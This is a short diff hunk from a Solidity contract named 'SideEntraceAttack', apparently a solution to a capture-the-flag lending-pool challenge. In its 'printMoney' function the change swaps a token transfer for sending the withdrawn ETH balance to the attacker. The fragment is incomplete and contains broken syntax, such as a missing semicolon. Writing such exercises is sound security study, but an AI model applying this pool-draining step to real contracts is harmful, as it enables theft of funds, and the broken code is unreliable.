@@ -46,7 +46,7 @@ contract SideEntraceAttack {
 
     function printMoney(){
         pool.withdraw()
-        token.transfer(attacker,balance);
+        address(attacker).send(balance);
 
     }
 
